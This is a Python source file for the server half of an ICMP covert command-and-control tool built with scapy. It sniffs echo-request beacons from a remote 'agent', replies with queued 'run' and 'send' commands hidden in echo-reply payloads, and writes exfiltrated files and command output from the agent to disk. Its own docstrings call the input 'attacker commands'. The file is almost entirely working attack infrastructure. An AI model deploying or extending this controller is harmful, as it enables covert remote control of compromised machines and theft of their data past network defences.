import signal
import os
import subprocess
import threading
import queue
from threading import Timer
from scapy.all import *


class Server:
    """
    Server class responsible for managing command execution and communication with agents.
    """


    CONFIG_FILE = "config.txt"


    def __init__(self):
        """
        Initializes the Server instance with initial attributes.
        """
        self.ECHO_REQUEST = "icmp[0]=8"
        self.command_queue = queue.Queue()
        self.path = None
        self.filename_to_handle = {}
        self.interface = None

    def start(self):
        """
        Starts the server by setting up signal handlers and launching necessary threads.
        """
        signal.signal(signal.SIGINT, self.signal_handler)
        self.interface = self.read_config_file()
        self.reset_beacon_timer()

        input_thread = threading.Thread(target=self.command_input)
        sniff_thread = threading.Thread(target=self.sniff_func)

        input_thread.start()
        sniff_thread.start()

    def signal_handler(self, sig, frame):
        """
        Handles the termination signal.
        """
        print(' Exiting...')
        sys.exit(0)

    def reset_beacon_timer(self):
        """
        Resets the beacon timer for checking agent activity.
        """
        if hasattr(self, 'beacon_timer'):
            self.beacon_timer.cancel()
        self.beacon_timer = Timer(60, self.agent_inactive)
        self.beacon_timer.start()

    def agent_inactive(self):
        """
        Prints that the agent is MIA due to inactivity.
        """
        print("No beacon received from the agent in the last minute.")

    def validate_interface(self):
        """
        Validates the network interface from config file.
        """
        try:
            subprocess.check_output(["ip", "link", "show", self.interface])
        except subprocess.CalledProcessError:
            print("Invalid interface.")
            sys.exit(1)

    def validate_path(self):
        """
        Validates the path from config file.
        """
        if not os.path.exists(self.path) or not os.path.isdir(self.path):
            print("Invalid path.")
            sys.exit(1)

    def read_config_file(self):
        """
        Reads the configuration file to retrieve interface and path settings.
        """
        with open(self.CONFIG_FILE, 'r') as config_file:
            for line in config_file:
                key, value = map(str.strip, line.split("="))
                if key == "Path":
                    self.path = value
                elif key == "Interface":
                    self.interface = value
        
            if self.interface is None or self.path is None:
                print("Interface / Path not found in the configuration file")
                sys.exit(1)
             
            self.validate_interface()
            self.validate_path()

            return self.interface

    def command_input(self):
        """
        Continuously reads attacker commands and add them to command queue.
        """
        while True:
            command = input("Enter a command: ")
            if command.lower().startswith("send"):
                filename = command.split(" ")[1]
                self.filename_to_handle[filename] = True
                self.command_queue.put(command)
            elif command.lower().startswith("run"):
                self.command_queue.put(command)
            else:
                print("Command format only start with 'run' or 'send'.")

    def parse_and_execute(self, payload, packet):
        """
        Parses and executes the received payload from agent.
        
        Args:
            payload: Payload received from the agent.
            packet : Received packet.
        """
        if payload.startswith(b'Hey server.'):
            while not self.command_queue.empty():
                command = self.command_queue.get()
                send(IP(dst=packet[IP].src)/ICMP(type="echo-reply", id=packet[ICMP].id)/Raw(load=command))
            else:
                print("Received a beacon from agent.")
                self.reset_beacon_timer()
        else:
            handled = False
            for filename in self.filename_to_handle:
                if payload.startswith(filename.encode('ascii')):
                    handled = True
                    payload_data = payload[len(filename):]
                    file_name = os.path.basename(filename)
                    file_path = os.path.join(self.path, file_name)
                    with open(file_path, "ab") as file_handle:
                        file_handle.write(payload_data)
                    file_handle.close()
                    break
            if not handled:
                with open(os.path.join(self.path, "commands_output.txt"), "a") as file_handle:
                    file_handle.write(payload.decode("utf-8"))
                    file_handle.write("\n")

    def handle_packet(self, packet):
        """
        Handles the received packet.
        
        Args:
            packet: Received packet.
        """
        try:
            payload = packet[0][Raw].load
        except:
            print("Something went wrong while handling the packet.")
            return
        self.parse_and_execute(payload, packet)

    def sniff_func(self):
        """
        Sniffs packets and handles them using handle_packet method.
        """
        sniff(iface=self.interface, filter=self.ECHO_REQUEST, prn=self.handle_packet, store='0')

if __name__ == "__main__":
    server = Server()
    server.start()


